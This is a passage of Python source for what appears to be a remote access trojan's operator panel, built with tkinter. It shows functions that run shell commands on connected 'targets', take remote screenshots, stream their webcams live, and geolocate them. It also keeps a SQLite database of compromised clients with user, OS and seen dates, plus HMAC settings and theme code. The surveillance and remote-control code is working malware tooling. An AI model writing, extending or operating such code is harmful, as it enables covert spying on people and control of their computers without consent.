        tk.Label(hdr2, text="GEO RESULTS", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=4)

        cols = ("ip", "city", "country", "org", "lat", "lon")
        self._map_tree = ttk.Treeview(right, columns=cols, show="headings",
                                      selectmode="browse")
        col_w = {"ip": 110, "city": 80, "country": 60, "org": 100, "lat": 60, "lon": 60}
        for col in cols:
            self._map_tree.heading(col, text=col.upper())
            self._map_tree.column(col, width=col_w.get(col, 80), anchor="w")
        map_vsb = ttk.Scrollbar(right, orient=tk.VERTICAL, command=self._map_tree.yview)
        self._map_tree.configure(yscrollcommand=map_vsb.set)
        map_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self._map_tree.pack(fill=tk.BOTH, expand=True)
        self._map_tree.bind("<<TreeviewSelect>>", self._map_tree_select)

        self._map_detail = tk.Label(right, text="", bg=T["BG2"], fg=T["FG"],
                                    font=FONT_SML, justify="left", wraplength=260)
        self._map_detail.pack(fill=tk.X, padx=8, pady=6)

    def _map_lookup_ip(self, ip):
        global _map_geo_cache
        if ip in _map_geo_cache:
            return _map_geo_cache[ip]
        try:
            import urllib.request
            url = f"https://ipinfo.io/{ip}/json"
            with urllib.request.urlopen(url, timeout=5) as r:
                data = json.loads(r.read().decode())
            loc  = data.get("loc", "0,0").split(",")
            lat, lon = float(loc[0]), float(loc[1])
            result = {
                "ip":      ip,
                "city":    data.get("city", ""),
                "country": data.get("country", ""),
                "org":     data.get("org", ""),
                "lat":     lat,
                "lon":     lon,
                "raw":     data,
            }
            _map_geo_cache[ip] = result
            return result
        except Exception as e:
            return {"ip": ip, "city": "", "country": "", "org": "", "lat": 0.0, "lon": 0.0,
                    "error": str(e)}

    def _map_add_pin(self, geo):
        T = THEME
        ip  = geo["ip"]
        lat = geo["lat"]; lon = geo["lon"]
        label = f"{ip}\n{geo['city']} {geo['country']}"
        # Treeview row
        for row in self._map_tree.get_children():
            if self._map_tree.item(row, "values")[0] == ip:
                self._map_tree.delete(row)
        self._map_tree.insert("", tk.END, values=(
            ip, geo["city"], geo["country"], geo.get("org", "")[:20],
            f"{lat:.2f}", f"{lon:.2f}"))
        if self._map_has_lib:
            if ip in self._map_markers:
                try: self._map_markers[ip].delete()
                except Exception: pass
            marker = self._map_widget.set_marker(lat, lon, text=label)
            self._map_markers[ip] = marker
        else:
            self._map_dots[ip] = (lat, lon)
            self._map_redraw_canvas()

    def _map_redraw_canvas(self):
        if self._map_has_lib:
            return
        c = self._map_canvas
        c.delete("dot")
        W = c.winfo_width() or 600
        H = c.winfo_height() or 400
        for ip, (lat, lon) in self._map_dots.items():
            # equirectangular projection
            x = int((lon + 180) / 360 * W)
            y = int((90 - lat) / 180 * H)
            c.create_oval(x-5, y-5, x+5, y+5, fill=THEME["ACCENT"], outline="", tags="dot")
            c.create_text(x+8, y, anchor="w", text=ip,
                          fill=THEME["FG"], font=("Consolas", 7), tags="dot")

    def _map_tree_select(self, event=None):
        sel = self._map_tree.selection()
        if not sel: return
        vals = self._map_tree.item(sel[0], "values")
        ip   = vals[0]
        geo  = _map_geo_cache.get(ip, {})
        raw  = geo.get("raw", {})
        detail = (f"IP:       {ip}\n"
                  f"City:     {raw.get('city','')}\n"
                  f"Region:   {raw.get('region','')}\n"
                  f"Country:  {raw.get('country','')}\n"
                  f"Org:      {raw.get('org','')}\n"
                  f"Postal:   {raw.get('postal','')}\n"
                  f"Timezone: {raw.get('timezone','')}\n"
                  f"Loc:      {raw.get('loc','')}")
        self._map_detail.configure(text=detail)
        if self._map_has_lib and ip in self._map_markers:
            try:
                lat = geo["lat"]; lon = geo["lon"]
                self._map_widget.set_position(lat, lon)
                self._map_widget.set_zoom(6)
            except Exception:
                pass

    def _map_geo_selected(self):
        if self.selected_cid is None:
            self.log("[map] no target selected"); return
        info = clients.get(self.selected_cid, {})
        ip   = info.get("label", "").split(":")[0]
        if not ip:
            self.log("[map] could not get IP from selected client"); return
        self._map_status.configure(text=f"looking up {ip} ...", fg=THEME["ACCENT2"])
        threading.Thread(target=self._map_lookup_worker, args=([ip],), daemon=True).start()

    def _map_geo_all(self):
        with _lock:
            ips = list({v["label"].split(":")[0] for v in clients.values()})
        if not ips:
            self.log("[map] no clients connected"); return
        self._map_status.configure(text=f"looking up {len(ips)} client(s) ...", fg=THEME["ACCENT2"])
        threading.Thread(target=self._map_lookup_worker, args=(ips,), daemon=True).start()

    def _map_lookup_worker(self, ips):
        for ip in ips:
            if not ip or ip in ("127.0.0.1", "0.0.0.0"):
                continue
            geo = self._map_lookup_ip(ip)
            self.after(0, lambda g=geo: self._map_add_pin(g))
            self.log(f"[map] {ip}  -> {geo.get('city','')} {geo.get('country','')}")
        self.after(0, lambda: self._map_status.configure(
            text=f"done  {len(ips)} lookup(s)", fg=THEME["GREEN"]))

    def _map_geo_from_client(self):
        if self.selected_cid is None:
            self.log("[map] no target selected"); return
        sock = clients[self.selected_cid]["sock"]
        self._map_status.configure(text="querying client geo ...", fg=THEME["ACCENT2"])
        threading.Thread(target=self._map_client_geo_worker, args=(sock,), daemon=True).start()

    def _map_client_geo_worker(self, sock):
        global _map_geo_cache
        try:
            send_msg(sock, "geolocate", {})
            resp = recv_msg(sock)
            if not resp:
                self.after(0, lambda: self._map_status.configure(text="no response", fg=THEME["RED"]))
                return
            data = resp.get("data", {}) or {}
            if "error" in data:
                self.after(0, lambda: self._map_status.configure(
                    text=f"client error: {data['error']}", fg=THEME["RED"]))
                return
            ip  = data.get("ip", "unknown")
            loc = data.get("loc", "0,0").split(",")
            try:
                lat, lon = float(loc[0]), float(loc[1])
            except Exception:
                lat, lon = 0.0, 0.0
            geo = {
                "ip":      ip,
                "city":    data.get("city", ""),
                "country": data.get("country", ""),
                "org":     data.get("org", ""),
                "lat":     lat,
                "lon":     lon,
                "raw":     data,
            }
            _map_geo_cache[ip] = geo
            self.after(0, lambda g=geo: self._map_add_pin(g))
            self.log(f"[map/client] {ip} -> {geo['city']} {geo['country']}")
            self.after(0, lambda: self._map_status.configure(
                text=f"client: {ip} {geo['city']} {geo['country']}", fg=THEME["GREEN"]))
        except Exception as e:
            self.after(0, lambda: self._map_status.configure(text=f"error: {e}", fg=THEME["RED"]))

    def _map_clear(self):
        global _map_geo_cache
        _map_geo_cache = {}
        for row in self._map_tree.get_children():
            self._map_tree.delete(row)
        self._map_detail.configure(text="")
        if self._map_has_lib:
            for m in self._map_markers.values():
                try: m.delete()
                except Exception: pass
            self._map_markers.clear()
        else:
            self._map_dots.clear()
            self._map_redraw_canvas()
        self._map_status.configure(text="cleared", fg=THEME["FG_DIM"])

    #  settings tab 

    def _build_settings_tab(self):
        T = THEME
        f = self._make_frame("Settings")
        hdr = tk.Frame(f, bg=T["BG2"], height=36)
        hdr.pack(fill=tk.X); hdr.pack_propagate(False)
        tk.Label(hdr, text="SETTINGS", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 11, "bold")).pack(side=tk.LEFT, padx=14, pady=6)
        pane = tk.PanedWindow(f, orient=tk.HORIZONTAL, bg=T["BG"],
                              sashwidth=4, sashrelief="flat")
        pane.pack(fill=tk.BOTH, expand=True)
        left = tk.Frame(pane, bg=T["BG2"])
        pane.add(left, minsize=380, width=460)
        tk.Label(left, text="HMAC SECRET", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=16, pady=(14, 2))
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=16, pady=4)
        sec_row = tk.Frame(left, bg=T["BG2"])
        sec_row.pack(fill=tk.X, padx=16, pady=4)
        tk.Label(sec_row, text="Current secret (b64):", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT, width=20, anchor="w").pack(side=tk.LEFT)
        self._set_secret_var = tk.StringVar(
            value=_active_secret.decode() if _active_secret else "")
        sec_entry = tk.Entry(sec_row, textvariable=self._set_secret_var,
                             bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
                             font=FONT_MON, width=36, relief="flat",
                             highlightbackground=T["BG4"], highlightthickness=1)
        sec_entry.pack(side=tk.LEFT, padx=(0, 6))
        sec_btn_row = tk.Frame(left, bg=T["BG2"])
        sec_btn_row.pack(fill=tk.X, padx=16, pady=(2, 8))
        tk.Button(sec_btn_row, text="generate new", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, cursor="hand2",
                  command=self._settings_gen_secret).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(sec_btn_row, text="save to config.json", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, cursor="hand2",
                  command=self._settings_save_secret).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(sec_btn_row, text="sync -> server & restart", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 9, "bold"), relief="flat", padx=10, cursor="hand2",
                  command=self._settings_sync_secret).pack(side=tk.LEFT)
        self._set_secret_status = tk.Label(left, text="", bg=T["BG2"], fg=T["FG_DIM"], font=FONT_SML)
        self._set_secret_status.pack(anchor="w", padx=16, pady=(0, 6))
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=16, pady=6)
        tk.Label(left, text="CONFIG FILE", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=16, pady=(6, 2))
        cfg_path_row = tk.Frame(left, bg=T["BG2"])
        cfg_path_row.pack(fill=tk.X, padx=16, pady=4)
        tk.Label(cfg_path_row, text="Path:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT, width=20, anchor="w").pack(side=tk.LEFT)
        tk.Label(cfg_path_row, text=CONFIG_FILE, bg=T["BG2"], fg=T["FG"],
                 font=FONT_SML, anchor="w").pack(side=tk.LEFT)
        cfg_btn_row = tk.Frame(left, bg=T["BG2"])
        cfg_btn_row.pack(fill=tk.X, padx=16, pady=(2, 8))
        tk.Button(cfg_btn_row, text="reload config", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, cursor="hand2",
                  command=self._settings_reload_config).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(cfg_btn_row, text="open in editor", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, cursor="hand2",
                  command=lambda: os.startfile(CONFIG_FILE) if os.path.exists(CONFIG_FILE) else None
                  ).pack(side=tk.LEFT)
        tk.Frame(left, bg=T["BG4"], height=1).pack(fill=tk.X, padx=16, pady=6)
        tk.Label(left, text="CLIENT DATABASE (SQLite)", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=16, pady=(6, 2))
        db_path_row = tk.Frame(left, bg=T["BG2"])
        db_path_row.pack(fill=tk.X, padx=16, pady=4)
        tk.Label(db_path_row, text="DB path:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT, width=20, anchor="w").pack(side=tk.LEFT)
        self._set_db_path_var = tk.StringVar(value=_config.get("db_path", DB_PATH_DEFAULT))
        db_entry = tk.Entry(db_path_row, textvariable=self._set_db_path_var,
                            bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
                            font=FONT_MON, width=36, relief="flat",
                            highlightbackground=T["BG4"], highlightthickness=1)
        db_entry.pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(db_path_row, text="...", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=6, cursor="hand2",
                  command=self._settings_browse_db).pack(side=tk.LEFT)
        db_btn_row = tk.Frame(left, bg=T["BG2"])
        db_btn_row.pack(fill=tk.X, padx=16, pady=(2, 4))
        tk.Button(db_btn_row, text="init / connect DB", bg=T["ACCENT"], fg=T["HDR_FG"],
                  font=("Segoe UI", 9, "bold"), relief="flat", padx=10, cursor="hand2",
                  command=self._settings_init_db).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(db_btn_row, text="disconnect DB", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, cursor="hand2",
                  command=self._settings_disconnect_db).pack(side=tk.LEFT, padx=(0, 6))
        tk.Button(db_btn_row, text="save path to config", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=10, cursor="hand2",
                  command=self._settings_save_db_path).pack(side=tk.LEFT)
        self._set_db_status = tk.Label(left, text="DB: not connected",
                                       bg=T["BG2"], fg=T["RED"], font=FONT_SML)
        self._set_db_status.pack(anchor="w", padx=16, pady=(2, 6))
        right = tk.Frame(pane, bg=T["BG"],
                         highlightbackground=T["ACCENT"], highlightthickness=1)
        pane.add(right, minsize=300)
        db_hdr = tk.Frame(right, bg=T["BG2"], height=30)
        db_hdr.pack(fill=tk.X); db_hdr.pack_propagate(False)
        tk.Label(db_hdr, text="KNOWN CLIENTS", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 9, "bold")).pack(side=tk.LEFT, padx=10, pady=5)
        tk.Button(db_hdr, text="refresh", bg=T["BG2"], fg=T["FG_DIM"],
                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
                  command=self._settings_refresh_db).pack(side=tk.RIGHT, padx=8, pady=4)
        tk.Button(db_hdr, text="delete selected", bg=T["BG2"], fg=T["RED"],
                  font=("Segoe UI", 8), relief="flat", cursor="hand2",
                  command=self._settings_delete_selected).pack(side=tk.RIGHT, padx=(0, 4), pady=4)
        cols = ("ip", "label", "user", "os", "first_seen", "last_seen", "note")
        self._set_db_tree = ttk.Treeview(right, columns=cols, show="headings",
                                         selectmode="browse")
        col_widths = {"ip": 110, "label": 130, "user": 80, "os": 80,
                      "first_seen": 130, "last_seen": 130, "note": 140}
        for col in cols:
            self._set_db_tree.heading(col, text=col.upper())
            self._set_db_tree.column(col, width=col_widths.get(col, 100), anchor="w")
        db_vsb = ttk.Scrollbar(right, orient=tk.VERTICAL, command=self._set_db_tree.yview)
        db_hsb = ttk.Scrollbar(right, orient=tk.HORIZONTAL, command=self._set_db_tree.xview)
        self._set_db_tree.configure(yscrollcommand=db_vsb.set, xscrollcommand=db_hsb.set)
        db_vsb.pack(side=tk.RIGHT, fill=tk.Y)
        db_hsb.pack(side=tk.BOTTOM, fill=tk.X)
        self._set_db_tree.pack(fill=tk.BOTH, expand=True)
        note_row = tk.Frame(right, bg=T["BG2"], height=32)
        note_row.pack(fill=tk.X, side=tk.BOTTOM); note_row.pack_propagate(False)
        tk.Label(note_row, text="Note:", bg=T["BG2"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=(10, 4), pady=6)
        self._set_note_var = tk.StringVar()
        note_entry = tk.Entry(note_row, textvariable=self._set_note_var,
                              bg=T["BG3"], fg=T["FG"], insertbackground=T["ACCENT"],
                              font=FONT_MON, width=28, relief="flat",
                              highlightbackground=T["BG4"], highlightthickness=1)
        note_entry.pack(side=tk.LEFT, padx=(0, 6), pady=6)
        tk.Button(note_row, text="save note", bg=T["BG3"], fg=T["FG"],
                  font=FONT, relief="flat", padx=8, cursor="hand2",
                  command=self._settings_save_note).pack(side=tk.LEFT, pady=6)

    def _settings_gen_secret(self):
        new = base64.b64encode(secrets.token_bytes(32)).decode()
        self._set_secret_var.set(new)
        self._set_secret_status.configure(text="new secret generated - save and sync to apply",
                                          fg=THEME["ACCENT2"])

    def _settings_save_secret(self):
        global _config
        val = self._set_secret_var.get().strip()
        try:
            base64.b64decode(val)
        except Exception:
            self._set_secret_status.configure(text="invalid base64", fg=THEME["RED"])
            return
        _config["hmac_secret"] = val
        _save_config()
        self._set_secret_status.configure(text=f"saved to {CONFIG_FILE}", fg=THEME["GREEN"])
        self.log(f"[settings] HMAC secret saved to config")

    def _settings_sync_secret(self):
        global _active_secret, SHARED_SECRET, _config
        val = self._set_secret_var.get().strip()
        try:
            base64.b64decode(val)
        except Exception:
            self._set_secret_status.configure(text="invalid base64", fg=THEME["RED"])
            return
        _active_secret = SHARED_SECRET = val.encode()
        _config["hmac_secret"] = val
        _save_config()
        try:
            port = int(self._listen_lbl.cget("text").split(":")[1])
        except Exception:
            port = PORT
        ok = self._restart_listener(port)
        if ok:
            self._set_secret_status.configure(text="synced + listener restarted", fg=THEME["GREEN"])
            self.log(f"[settings] secret synced, listener restarted on :{port}")
        else:
            self._set_secret_status.configure(text="secret set but listener failed", fg=THEME["RED"])

    def _settings_reload_config(self):
        _load_config()
        self._set_secret_var.set(_active_secret.decode() if _active_secret else "")
        self._set_db_path_var.set(_config.get("db_path", DB_PATH_DEFAULT))
        self._set_secret_status.configure(text="config reloaded", fg=THEME["GREEN"])
        self.log("[settings] config reloaded from disk")

    def _settings_browse_db(self):
        path = filedialog.asksaveasfilename(defaultextension=".db",
                                            filetypes=[("SQLite DB", "*.db"), ("All", "*.*")])
        if path:
            self._set_db_path_var.set(path)

    def _settings_init_db(self):
        path = self._set_db_path_var.get().strip()
        if not path:
            return
        ok = _db_init(path)
        if ok:
            self._set_db_status.configure(text=f"DB connected: {path}", fg=THEME["GREEN"])
            self.log(f"[db] connected: {path}")
            self._settings_refresh_db()
        else:
            self._set_db_status.configure(text="DB init failed (see console)", fg=THEME["RED"])

    def _settings_disconnect_db(self):
        _db_close()
        self._set_db_status.configure(text="DB: disconnected", fg=THEME["FG_DIM"])
        self.log("[db] disconnected")
        for row in self._set_db_tree.get_children():
            self._set_db_tree.delete(row)

    def _settings_save_db_path(self):
        global _config
        path = self._set_db_path_var.get().strip()
        _config["db_path"] = path
        _save_config()
        self._set_db_status.configure(text=f"path saved to config", fg=THEME["GREEN"])
        self.log(f"[settings] db_path saved to config: {path}")

    def _settings_refresh_db(self):
        if not hasattr(self, "_set_db_tree"):
            return
        for row in self._set_db_tree.get_children():
            self._set_db_tree.delete(row)
        rows = _db_fetch_all()
        for r in rows:
            self._set_db_tree.insert("", tk.END, values=r)
        if _db_conn:
            self._set_db_status.configure(
                text=f"DB connected: {self._set_db_path_var.get()}  ({len(rows)} records)",
                fg=THEME["GREEN"])

    def _settings_delete_selected(self):
        sel = self._set_db_tree.selection()
        if not sel:
            return
        vals = self._set_db_tree.item(sel[0], "values")
        if not vals:
            return
        ip = vals[0]
        if messagebox.askyesno("delete", f"Remove {ip} from DB?"):
            _db_delete(ip)
            self._settings_refresh_db()
            self.log(f"[db] deleted {ip}")

    def _settings_save_note(self):
        sel = self._set_db_tree.selection()
        if not sel:
            return
        vals = self._set_db_tree.item(sel[0], "values")
        if not vals:
            return
        ip   = vals[0]
        note = self._set_note_var.get().strip()
        _db_update_note(ip, note)
        self._settings_refresh_db()
        self.log(f"[db] note saved for {ip}")

    #  customize tab

    def _build_custom_tab(self):
        T = THEME
        f = self._make_frame("Customize")
        f.configure(bg=T["BG"])
        top = tk.Frame(f, bg=T["BG2"], height=44)
        top.pack(fill=tk.X)
        top.pack_propagate(False)
        tk.Label(top, text="THEME PRESETS", bg=T["BG2"], fg=T["ACCENT"],
                 font=("Segoe UI", 10, "bold")).pack(side=tk.LEFT, padx=14, pady=10)
        preset_icons = {
            "orange": "O", "green": "G", "black": "B",
            "purple": "P", "pink": "K", "stars": "*",
        }
        for pname, icon in preset_icons.items():
            tk.Button(top, text=f"{icon} {pname.capitalize()}",
                      bg=T["BG3"], fg=T["FG"],
                      activebackground=T["ACCENT"], activeforeground=T["HDR_FG"],
                      font=("Segoe UI", 9, "bold"), relief="flat",
                      padx=10, pady=4, cursor="hand2",
                      command=lambda p=pname: self._load_preset(p)
                      ).pack(side=tk.LEFT, padx=4, pady=8)
        tk.Button(top, text="APPLY",
                  bg=T["ACCENT"], fg=T["HDR_FG"],
                  activebackground=T["ACCENT2"], activeforeground=T["HDR_FG"],
                  font=("Segoe UI", 10, "bold"), relief="flat",
                  padx=14, pady=4, cursor="hand2",
                  command=self._apply_custom).pack(side=tk.RIGHT, padx=14, pady=8)
        scroll_host = tk.Frame(f, bg=T["BG"])
        scroll_host.pack(fill=tk.BOTH, expand=True)
        canvas = tk.Canvas(scroll_host, bg=T["BG"], highlightthickness=0)
        sb     = ttk.Scrollbar(scroll_host, orient=tk.VERTICAL, command=canvas.yview)
        canvas.configure(yscrollcommand=sb.set)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        inner = tk.Frame(canvas, bg=T["BG"])
        canvas_win = canvas.create_window((0, 0), window=inner, anchor="nw")
        inner.bind("<Configure>",
                   lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.bind("<Configure>",
                    lambda e: canvas.itemconfig(canvas_win, width=e.width))
        self._custom_vars     = {}
        self._custom_swatches = {}
        FIELDS = [
            ("BG", "Background (main)"), ("BG2", "Background (panels)"),
            ("BG3", "Background (inputs / buttons)"), ("BG4", "Background (hover / selected)"),
            ("FG", "Foreground (primary text)"), ("FG_DIM", "Foreground (dim text)"),
            ("ACCENT", "Accent (primary)"), ("ACCENT2", "Accent (hover)"),
            ("HDR_FG", "Header text / button text on accent"),
            ("NAV_BG", "Nav / header bar background"),
            ("RED", "Alert / error colour"), ("GREEN", "Success / online colour"),
            ("GRID_BDR", "Client grid border"), ("CELL_BG", "Client grid cell background"),
        ]
        for key, label in FIELDS:
            row = tk.Frame(inner, bg=T["BG"])
            row.pack(fill=tk.X, padx=20, pady=5)
            tk.Label(row, text=label, bg=T["BG"], fg=T["FG"],
                     font=FONT, width=34, anchor="w").pack(side=tk.LEFT)
            var = tk.StringVar(value=THEME.get(key, "#000000"))
            self._custom_vars[key] = var
            entry = tk.Entry(row, textvariable=var, bg=T["BG3"], fg=T["FG"],
                             insertbackground=T["ACCENT"], font=FONT_MON,
                             width=10, relief="flat",
                             highlightbackground=T["BG4"], highlightthickness=1)
            entry.pack(side=tk.LEFT, padx=(0, 8))
            entry.bind("<FocusOut>", lambda e, k=key: self._update_swatch(k))
            entry.bind("<Return>",   lambda e, k=key: self._update_swatch(k))
            swatch_color = THEME.get(key, "#000000")
            swatch = tk.Frame(row, bg=swatch_color, width=36, height=22,
                              highlightbackground=T["BG4"], highlightthickness=1,
                              cursor="hand2")
            swatch.pack(side=tk.LEFT, padx=(0, 8))
            swatch.pack_propagate(False)
            swatch.bind("<Button-1>", lambda e, k=key: self._pick_color(k))
            self._custom_swatches[key] = swatch
        star_row = tk.Frame(inner, bg=T["BG"])
        star_row.pack(fill=tk.X, padx=20, pady=10)
        tk.Label(star_row, text="Stars background  (src/icons/background/stars.png)",
                 bg=T["BG"], fg=T["FG"], font=FONT, width=34, anchor="w").pack(side=tk.LEFT)
        self._stars_var = tk.BooleanVar(value=bool(THEME.get("STARS_BG", False)))
        tk.Checkbutton(star_row, variable=self._stars_var,
                       bg=T["BG"], fg=T["FG"], selectcolor=T["BG3"],
                       activebackground=T["BG"], activeforeground=T["ACCENT"],
                       font=FONT, bd=0, highlightthickness=0).pack(side=tk.LEFT)
        prev_frame = tk.Frame(f, bg=T["BG4"], height=52)
        prev_frame.pack(fill=tk.X, side=tk.BOTTOM)
        prev_frame.pack_propagate(False)
        tk.Label(prev_frame, text="PREVIEW  ->", bg=T["BG4"], fg=T["FG_DIM"],
                 font=FONT).pack(side=tk.LEFT, padx=14, pady=12)
        self._prev_bg  = tk.Label(prev_frame, text="  BG  ", font=FONT,
                                  bg=THEME["BG"], fg=THEME["FG"])
        self._prev_bg.pack(side=tk.LEFT, padx=4, pady=10)
        self._prev_acc = tk.Label(prev_frame, text="  ACCENT  ",
                                  font=("Segoe UI", 9, "bold"),
                                  bg=THEME["ACCENT"], fg=THEME["HDR_FG"])
        self._prev_acc.pack(side=tk.LEFT, padx=4, pady=10)
        self._prev_nav = tk.Label(prev_frame, text="  NAV  ",
                                  font=("Segoe UI", 9, "bold"),
                                  bg=THEME["NAV_BG"], fg=THEME["FG"])
        self._prev_nav.pack(side=tk.LEFT, padx=4, pady=10)
        self._prev_btn = tk.Label(prev_frame, text="  BUTTON  ", font=FONT,
                                  bg=THEME["BG3"], fg=THEME["FG"])
        self._prev_btn.pack(side=tk.LEFT, padx=4, pady=10)
        self._prev_txt = tk.Label(prev_frame, text="  dim text  ", font=FONT,
                                  bg=THEME["BG2"], fg=THEME["FG_DIM"])
        self._prev_txt.pack(side=tk.LEFT, padx=4, pady=10)

    def _update_swatch(self, key):
        val = self._custom_vars[key].get().strip()
        if not val.startswith("#") or len(val) not in (4, 7):
            return
        try:
            self._custom_swatches[key].configure(bg=val)
            self._update_preview()
        except Exception:
            pass

    def _pick_color(self, key):
        current = self._custom_vars[key].get()
        _, hex_color = colorchooser.askcolor(color=current, title=f"Pick {key}")
        if hex_color:
            self._custom_vars[key].set(hex_color.upper())
            self._custom_swatches[key].configure(bg=hex_color)
            self._update_preview()

    def _update_preview(self):
        try:
            self._prev_bg.configure(bg=self._custom_vars["BG"].get(),
                                    fg=self._custom_vars["FG"].get())
            self._prev_acc.configure(bg=self._custom_vars["ACCENT"].get(),
                                     fg=self._custom_vars["HDR_FG"].get())
            self._prev_nav.configure(bg=self._custom_vars["NAV_BG"].get(),
                                     fg=self._custom_vars["FG"].get())
            self._prev_btn.configure(bg=self._custom_vars["BG3"].get(),
                                     fg=self._custom_vars["FG"].get())
            self._prev_txt.configure(bg=self._custom_vars["BG2"].get(),
                                     fg=self._custom_vars["FG_DIM"].get())
        except Exception:
            pass

    def _load_preset(self, preset_name):
        preset = THEME_PRESETS.get(preset_name, {})
        for key, var in self._custom_vars.items():
            if key in preset:
                var.set(preset[key])
                try:
                    self._custom_swatches[key].configure(bg=preset[key])
                except Exception:
                    pass
        if hasattr(self, "_stars_var"):
            self._stars_var.set(bool(preset.get("STARS_BG", False)))
        self._update_preview()
        self.log(f"[theme] preset loaded: {preset_name} click APPLY to apply")

    def _apply_custom(self):
        global THEME
        for key, var in self._custom_vars.items():
            val = var.get().strip()
            if val.startswith("#") and len(val) in (4, 7):
                THEME[key] = val
        THEME["STARS_BG"] = self._stars_var.get() if hasattr(self, "_stars_var") else False
        self.log("[theme] applying custom theme rebuilding UI")
        self.after(50, self._full_theme_rebuild)

    #  shared helpers 

    def _shell_send(self):
        cmd = self.shell_entry.get().strip()
        if not cmd or self.selected_cid is None: return
        self.shell_entry.delete(0, tk.END)
        sock = clients[self.selected_cid]["sock"]
        self._append(self.shell_out, f"HermiesShell> {cmd}\n")
        threading.Thread(target=self._shell_worker,
                         args=(sock, self.shell_var.get(), cmd), daemon=True).start()

    def _shell_worker(self, sock, shell_type, cmd):
        try:
            send_msg(sock, "shell", {"shell": shell_type, "cmd": cmd})
            resp = recv_msg(sock)
            out  = resp["data"] if resp else "<no response>"
        except Exception as e:
            out = f"<error: {e}>"
        self._append(self._shell_out_right,
                     f"[{shell_type}] {cmd}\n{out}\n{'' * 60}\n")

    def _screenshot(self):
        if self.selected_cid is None: return self.log("no target selected")
        if self._cam_streaming:       return self.log("stop camera stream first")
        threading.Thread(target=self._ss_worker,
                         args=(clients[self.selected_cid]["sock"],), daemon=True).start()

    def _ss_worker(self, sock):
        try:
            send_msg(sock, "screenshot", None)
            resp = recv_msg(sock)
            if not resp: return self.log("screenshot: no response")
            envelope = resp.get("data")
            if isinstance(envelope, dict):
                b64    = envelope.get("data")
                method = envelope.get("method", "?")
                errors = envelope.get("errors", [])
                if not b64:
                    for e in errors: self.log(f"  ss fail: {e}")
                    return self.log("screenshot: all methods failed")
            elif isinstance(envelope, str):
                b64, method = envelope, "legacy"
            else:
                return self.log("screenshot: bad envelope")
            raw = base64.b64decode(b64)
            img = Image.open(io.BytesIO(raw)); self._ss_pil = img
            def _update():
                w = max(self.ss_label.winfo_width(), 200)
                h = max(self.ss_label.winfo_height(), 150)
                thumb = img.copy(); thumb.thumbnail((w, h), Image.LANCZOS)
                tk_img = ImageTk.PhotoImage(thumb)
                self.ss_label.configure(image=tk_img, text="")
                self._ss_image = tk_img
                self._ss_method_lbl.configure(text=f"via {method}")
                self.log(f"screenshot ok  [{method}]  {img.width}x{img.height}")
            self.after(0, _update)
        except Exception as e:
            self.log(f"screenshot error: {e}")

    def _save_screenshot(self):
        if not self._ss_pil: return
        path = filedialog.asksaveasfilename(defaultextension=".png",
                                            filetypes=[("PNG", "*.png"), ("All", "*.*")])
        if path: self._ss_pil.save(path); self.log(f"screenshot saved -> {path}")

    def _cam_toggle_stream(self):
        if self._cam_streaming: self._cam_stop_stream()
        else: self._cam_start_stream()

    def _cam_start_stream(self):
        if self.selected_cid is None: return self.log("no target selected")
        old = getattr(self, "_cam_stream_thread", None)
        if old and old.is_alive():
            old.join(timeout=2.0)
            if old.is_alive(): return self.log("camera: previous worker still alive")
        try: fps = max(1, min(30, int(self.cam_fps_var.get())))
        except ValueError: fps = 10
        self._cam_streaming = True
        self._cam_live_btn.configure(text="  STOP  ")
        self.log(f"camera: live feed start  idx={self.cam_idx_var.get()}  fps={fps}")
        self._cam_frame_times = []
        self._cam_stream_thread = threading.Thread(
            target=self._cam_stream_worker,
            args=(clients[self.selected_cid]["sock"],
                  self.cam_idx_var.get(), round(1.0 / fps, 3)), daemon=True)
        self._cam_stream_thread.start()

    def _cam_stop_stream(self):
        if not self._cam_streaming: return
        self._cam_streaming = False
        self._cam_live_btn.configure(text="  START  ")
        self._cam_fps_lbl.configure(text="")
        self.log("camera: live feed stopped")
        try:
            if self.selected_cid is not None:
                send_msg(clients[self.selected_cid]["sock"], "camera_stream_stop", None)
        except Exception: pass

    def _cam_stream_worker(self, sock, idx, interval):
        import select as _sel
        try:
            send_msg(sock, "camera_stream", {"index": idx, "interval": interval})
            while True:
                r, _, _ = _sel.select([sock], [], [], 0.5)
                if not r:
                    if not self._cam_streaming: break
                    continue
                resp = recv_msg(sock)
                if resp is None or resp.get("cmd") == "camera_stream_ended": break
                if not self._cam_streaming: break
